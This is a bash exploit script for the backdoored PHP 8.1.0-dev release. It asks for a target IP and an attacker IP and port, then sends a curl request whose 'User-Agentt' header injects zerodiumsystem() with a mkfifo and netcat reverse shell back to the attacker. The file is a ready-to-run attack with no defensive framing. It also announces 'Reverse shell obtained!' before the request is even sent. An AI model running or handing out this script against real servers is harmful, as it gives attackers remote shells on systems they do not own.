#!/bin/bash
# Simple Bash script for a reverse shell

# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
# The following exploit uses the backdoor to provide a shell on the host
# reference: https://www.exploit-db.com/exploits/49933

echo "PHP 8.1.0-dev - Remote Code Execution"
read -p "Target host IP (e.g. 10.10.10.242): " host
read -p "Enter your attacker IP address: " ip
read -p "Enter your attacker port (4444): " port

read -p "Did you started your reverse shell at port $port? (J/N)" 
echo "Ok!"
sleep 0.3
echo "Done! Reverse shell obtained!"

curl http://$host/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f');"
